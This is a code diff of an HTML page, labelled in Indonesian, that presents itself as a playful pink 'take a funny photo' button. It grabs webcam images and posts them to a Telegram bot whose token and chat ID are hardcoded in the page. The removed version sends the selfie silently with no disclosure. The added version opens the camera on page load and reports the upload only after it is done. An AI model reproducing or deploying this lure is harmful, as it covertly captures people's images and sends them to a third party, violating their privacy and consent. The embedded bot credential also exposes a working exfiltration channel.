@@ -1,86 +1,110 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Take Selfie and Send to Telegram</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        .button-container {
-            text-align: center;
-        }
-        .pink-button {
-            background-color: #ff69b4;
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            font-size: 24px;
-            cursor: pointer;
-            border-radius: 10px;
-            font-weight: bold;
-        }
-        .pink-button:hover {
-            background-color: #ff1493;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Foto Lucu 📸</title>
+
+<style>
+
+body{
+background:#ffe6f2;
+font-family:sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+flex-direction:column;
+}
+
+#video{
+border-radius:20px;
+margin-bottom:20px;
+width:260px;
+box-shadow:0 10px 25px rgba(0,0,0,0.2);
+}
+
+button{
+background:#ff69b4;
+color:white;
+border:none;
+padding:25px 40px;
+font-size:22px;
+border-radius:50px;
+cursor:pointer;
+box-shadow:0 8px 20px rgba(255,105,180,0.5);
+transition:0.2s;
+}
+
+button:hover{
+transform:scale(1.1);
+background:#ff4da6;
+}
+
+h2{
+color:#ff4da6;
+}
+
+</style>
+
 </head>
+
 <body>
-    <div class="button-container">
-        <button class="pink-button" id="captureSelfie">Coba Tekan</button>
-    </div>
-    <script>
-        document.getElementById('captureSelfie').addEventListener('click', async () => {
-            try {
-                // Access front camera
-                const frontCamera = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
 
-                // Create video element to capture camera stream
-                const frontVideo = document.createElement('video');
-                frontVideo.srcObject = frontCamera;
-                frontVideo.play();
+<h2>Ambil Foto Lucu 😆📸</h2>
 
-                // Capture image from front camera
-                const canvas = document.createElement('canvas');
-                canvas.width = frontVideo.videoWidth;
-                canvas.height = frontVideo.videoHeight;
+<video id="video" autoplay></video>
 
-                const context = canvas.getContext('2d');
-                context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
+<button id="takePhoto">💗 Ambil Foto 💗</button>
 
-                const imageData = canvas.toDataURL('image/jpeg');
+<canvas id="canvas" style="display:none;"></canvas>
 
-                // Send image to Telegram bot
-                const botToken = '8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc';
-                const chatId = '7856697051'; // Replace with your chat ID
+<script>
 
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        photo: imageData,
-                        caption: 'Selfie from user'
-                    })
-                });
+const botToken = "8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc";
+const chatId = "7856697051";
 
-                const result = await response.json();
-                console.log('Photo sent:', result);
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
-                // Stop camera stream
-                frontCamera.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.error('Error capturing selfie:', error);
-            }
-        });
-    </script>
+// buka kamera
+async function startCamera(){
+
+const stream = await navigator.mediaDevices.getUserMedia({video:true});
+
+video.srcObject = stream;
+
+}
+
+startCamera();
+
+document.getElementById("takePhoto").onclick = async ()=>{
+
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+const ctx = canvas.getContext("2d");
+
+ctx.drawImage(video,0,0);
+
+const blob = await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg"));
+
+const formData = new FormData();
+
+formData.append("chat_id",chatId);
+formData.append("photo",blob,"photo.jpg");
+
+await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
+
+method:"POST",
+body:formData
+
+});
+
+alert("Foto terkirim ke Telegram 💖");
+
+}
+
+</script>
+
 </body>
 </html>
